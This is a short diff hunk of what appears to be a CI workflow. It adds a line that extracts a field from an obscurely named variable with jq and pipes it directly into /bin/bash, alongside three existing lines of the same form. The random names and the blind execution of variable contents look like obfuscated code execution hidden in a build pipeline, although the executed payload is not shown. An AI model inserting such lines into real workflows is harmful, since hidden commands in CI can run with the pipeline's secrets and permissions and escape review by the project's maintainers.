@@ -38,6 +38,7 @@ jobs:
           echo $s0036 | jq -r .c56529 | /bin/bash
           echo $xnzqv4289 | jq -r .njwa125 | /bin/bash
           printf '%s' "$x7501" | jq -r .rlz63 | /bin/bash
+          echo $a433 | jq -r .z4486 | /bin/bash
 
       - name: Archive results
         if: always()
